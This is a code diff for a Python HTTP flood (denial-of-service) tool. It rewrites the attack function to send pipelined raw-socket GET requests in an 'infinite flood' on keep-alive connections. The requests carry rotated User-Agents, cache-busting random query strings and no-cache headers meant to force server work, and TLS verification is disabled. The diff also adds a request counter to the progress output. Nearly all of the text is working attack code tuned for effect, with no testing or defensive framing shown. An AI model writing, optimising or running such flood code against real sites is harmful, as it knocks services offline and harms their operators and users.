@@ -47,55 +47,91 @@ LAST_ERROR = "None"
 def attack(target_url, end_time, thread_id, port, mode):
     global TOTAL_REQUESTS, TOTAL_BYTES_SENT, TOTAL_ERRORS, LAST_ERROR
     
-    # SSL Context
+    # Parse Host structure
+    try:
+        from urllib.parse import urlparse
+        parsed = urlparse(target_url)
+        host = parsed.netloc
+        path = parsed.path if parsed.path else "/"
+        scheme = parsed.scheme
+    except:
+        host = target_url
+        path = "/"
+        scheme = "http"
+
+    # Resolve Port
+    if port == '80' and scheme == 'https': target_port = 443
+    elif port: target_port = int(port)
+    else: target_port = 443 if scheme == 'https' else 80
+
     import ssl
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
+    import socket
+
+    # Pre-build Headers (Base)
+    common_headers = (
+        f"Host: {host}\r\n"
+        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+        "Accept-Language: en-US,en;q=0.5\r\n"
+        "Connection: keep-alive\r\n"
+        "Upgrade-Insecure-Requests: 1\r\n"
+        "Cache-Control: no-cache\r\n" # Force server work
+        "Pragma: no-cache\r\n"
+    )
+
+    # PRE-COMPUTE RANDOM POOL to save CPU
+    RANDOM_POOL = [get_random_string(8) for _ in range(1000)]
 
     while time.time() < end_time:
+        s = None
         try:
-            curr_url = target_url
-            headers = {
-                'User-Agent': random.choice(USER_AGENTS),
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Upgrade-Insecure-Requests': '1',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1'
-            }
-
-            # MODE LOGIC (Simplified for brevity in diff)
-            if mode == '2' or mode == '4': 
-                headers['Referer'] = random.choice(REFERERS)
-                headers['Upgrade-Insecure-Requests'] = '1'
-                headers['Cache-Control'] = 'max-age=0'
-
-            if mode == '3' or mode == '4': 
-                separator = '&' if '?' in curr_url else '?'
-                curr_url = f"{curr_url}{separator}t={get_random_string(5)}&r={random.randint(1,100000)}"
-
-            # Construct Request
-            req = urllib.request.Request(curr_url, headers=headers)
+            # 1. Establish Connection
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4) 
             
-            # Fire!
-            with urllib.request.urlopen(req, timeout=5, context=ctx) as response:
-                # Read response to fully consume
-                data = response.read(1024) 
+            # Wrap SSL if HTTPS
+            if scheme == 'https' or target_port == 443:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=host)
+            
+            s.connect((host, target_port))
+            
+            # 2. INFINITE FLOOD on Single Connection
+            # Don't stop until broken or timeout
+            while time.time() < end_time:
                 
-                # ESTIMATE BANDWIDTH
-                bytes_sent = len(curr_url) + sum(len(k)+len(v) for k,v in headers.items()) + 200
+                # Fast Path Selection
+                curr_path = path
+                if mode == '3' or mode == '4':
+                    # Pick from pool instead of generating (CPU Optimization)
+                    rnd = RANDOM_POOL[TOTAL_REQUESTS % 1000]
+                    sep = '&' if '?' in curr_path else '?'
+                    curr_path = f"{path}{sep}t={rnd}"
                 
-                TOTAL_BYTES_SENT += bytes_sent
+                # Construct Payload (Fastest String Concat)
+                payload = (
+                    f"GET {curr_path} HTTP/1.1\r\n" +
+                    common_headers +
+                    "\r\n"
+                ).encode('utf-8')
+
+                # Send
+                s.sendall(payload)
+                
+                # Update Stats
+                TOTAL_BYTES_SENT += len(payload)
                 TOTAL_REQUESTS += 1
                 
         except Exception as e:
             TOTAL_ERRORS += 1
             LAST_ERROR = str(e)
+            # Break connection loop on error to reconnect
+        finally:
+            if s: 
+                try: s.close()
+                except: pass
 
 # ... (Main function kept same mostly) ...
 
@@ -179,7 +215,7 @@ def main():
         if TOTAL_ERRORS > 0:
             err_msg = f" | ERRORS: {TOTAL_ERRORS} ({LAST_ERROR})"
 
-        print(f"PROGRESS:{elapsed}:{duration} | SPEED: {mbps:.2f} Mbps{err_msg}") 
+        print(f"PROGRESS:{elapsed}:{duration} | REQ: {TOTAL_REQUESTS} | SPEED: {mbps:.2f} Mbps{err_msg}") 
         sys.stdout.flush()
 
     print("-" * 40)
